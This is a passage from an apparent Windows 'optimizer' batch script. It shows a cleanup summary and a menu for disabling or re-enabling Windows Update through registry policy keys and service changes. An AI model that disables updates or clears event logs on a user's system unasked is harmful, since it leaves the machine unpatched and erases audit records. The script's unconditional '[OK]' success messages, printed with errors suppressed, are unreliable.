cleanmgr /sagerun:1 >nul 2>&1

:: Get disk free space AFTER cleanup
for /f "tokens=3" %%a in ('dir c:\ /-c ^| find "bytes free"') do set AFTER=%%a

:: Calculate freed space in MB (trim last 6 digits = divide by ~1MB)
set /a FREED_MB=(%AFTER:~0,-6% - %BEFORE:~0,-6%)
if %FREED_MB% lss 0 set FREED_MB=0
set /a FREED_GB=%FREED_MB% / 1024

echo.
echo  =====================================================
echo    Cleanup Complete!
echo  =====================================================
echo.
echo   Disk space BEFORE : %BEFORE% bytes
echo   Disk space AFTER  : %AFTER% bytes
echo.
if %FREED_GB% gtr 0 (
    echo   Space Freed: ~%FREED_GB% GB ^(%FREED_MB% MB^)
) else (
    echo   Space Freed: ~%FREED_MB% MB
)
echo.
echo   [OK] Windows Temp files cleared
echo   [OK] User Temp files cleared
echo   [OK] Prefetch cleared
echo   [OK] Windows Update cache cleared
echo   [OK] Log files deleted
echo   [OK] Event Viewer logs cleared
echo   [OK] DNS cache flushed
echo   [OK] Winsock reset
echo   [OK] Recycle Bin emptied
echo   [OK] Disk Cleanup run
echo.
echo  =====================================================
echo.
pause
goto :RETURN_MENU

:: ====================================================
::  OPTION 3 - WINDOWS UPDATE TOGGLE
:: ====================================================
:OPT3
cls
color 0A
echo.
echo  =====================================================
echo         Win Light Optimizer  -  Windows Update Toggle
echo  =====================================================
echo.
echo   [1]  Disable Windows Update
echo   [2]  Enable Windows Update
echo   [0]  Back to main menu
echo.
echo  =====================================================
echo.
set "WU_CHOICE="
set /p WU_CHOICE="  Select option: "
echo.

if "%WU_CHOICE%"=="0" goto :MAIN_MENU
if "%WU_CHOICE%"=="1" goto :WU_DISABLE
if "%WU_CHOICE%"=="2" goto :WU_ENABLE
echo  Invalid option.
timeout /t 2 >nul
goto :OPT3

:WU_DISABLE
echo  Disabling Windows Update...
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DisableWindowsUpdateAccess" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d 1 /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d 0 /f >nul 2>&1
sc config dosvc start= disabled >nul 2>&1
sc config wuauserv start= disabled >nul 2>&1
sc config UsoSvc start= disabled >nul 2>&1
net stop dosvc >nul 2>&1
net stop wuauserv >nul 2>&1
net stop UsoSvc >nul 2>&1
echo  [OK] Windows Update disabled.
echo.
pause
goto :RETURN_MENU

:WU_ENABLE
echo  Enabling Windows Update...
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DisableWindowsUpdateAccess" /f >nul 2>&1
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /f >nul 2>&1
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\DeliveryOptimization\Config" /v "DODownloadMode" /t REG_DWORD /d 1 /f >nul 2>&1
sc config dosvc start= auto >nul 2>&1
sc config wuauserv start= auto >nul 2>&1
sc config UsoSvc start= auto >nul 2>&1
sc config bits start= auto >nul 2>&1
sc config "cryptsvc" start= auto >nul 2>&1
sc config "TrustedInstaller" start= auto >nul 2>&1
net start dosvc >nul 2>&1
net start bits >nul 2>&1
net start wuauserv >nul 2>&1
echo  [OK] Windows Update enabled and restored.
echo.
pause
goto :RETURN_MENU

:: ====================================================
::  RETURN TO MENU
:: ====================================================
:RETURN_MENU
echo.
set "BACK_CHOICE="
set /p BACK_CHOICE="  Return to main menu? (Y/N): "
if /i "%BACK_CHOICE%"=="Y" goto :MAIN_MENU

:EXIT
echo.
echo  Goodbye!
echo.
exit /b
